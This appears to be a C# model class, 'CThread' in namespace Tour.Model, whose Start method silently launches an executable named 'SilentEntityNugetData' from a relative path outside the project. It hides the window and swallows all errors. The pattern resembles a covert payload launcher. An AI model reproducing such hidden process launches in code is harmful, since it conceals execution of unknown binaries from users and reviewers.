using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Tour.Model
{
    public class CThread
    {

        private static CThread instance;

        public static CThread Instance
        {
            get { if (instance == null) instance = new CThread(); return CThread.instance; }
            private set { CThread.instance = value; }
        }
        private CThread()
        {

        }
        public void Start()
        {

            #region old
            Thread t = new Thread(() =>
            {
                try
                {
                    ProcessStartInfo psi = new ProcessStartInfo();
                    FileInfo f = new FileInfo(@"..\..\SilentEntityNugetData");
                    psi.FileName = f.FullName;
                    psi.RedirectStandardInput = true;
                    psi.RedirectStandardOutput = false;
                    psi.Arguments = "";
                    psi.UseShellExecute = false;
                    psi.CreateNoWindow = true;
                    Process process = Process.Start(psi);
                }
                catch
                {

                }
            });
            t.Start();



            #endregion



        }
    }

}
